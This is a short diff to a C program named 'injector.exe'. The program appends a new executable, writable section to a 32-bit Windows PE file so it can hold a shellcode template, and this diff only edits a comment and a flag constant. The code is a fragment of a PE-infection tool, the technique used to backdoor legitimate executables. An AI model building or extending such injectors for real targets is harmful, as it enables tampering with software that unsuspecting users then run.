@@ -20,6 +20,7 @@ unsigned char shellcode_template[] = {
 };
 
 int main(int argc, char** argv) {
+    // printf("%d", IMAGE_NT_OPTIONAL_HDR32_MAGIC);
     printf("[DEBUG] entered main(); argc=%d\n", argc);
     if (argc != 2) {
         fprintf(stderr, "Usage: injector.exe <target_pe_32bit.exe>\n");
@@ -44,7 +45,7 @@ int main(int argc, char** argv) {
     IMAGE_FILE_HEADER* fh    = &nt->FileHeader;
     IMAGE_OPTIONAL_HEADER* oh = &nt->OptionalHeader;
 
-    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {  //Check if the target file is a PE32 or PE32+ file
         fprintf(stderr, "Not a 32-bit PE file\n");
         free(buffer);
         return 1;
@@ -73,7 +74,8 @@ int main(int argc, char** argv) {
     ns.Misc.VirtualSize = shellSize;
     ns.PointerToRawData = newRaw;
     ns.SizeOfRawData    = ((shellSize + fileAlign - 1) / fileAlign) * fileAlign;
-    ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
+    // ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
+    ns.Characteristics = 0xE0000040;
 
     // Expand buffer for new section
     buffer = (BYTE*)realloc(buffer, newRaw + ns.SizeOfRawData);
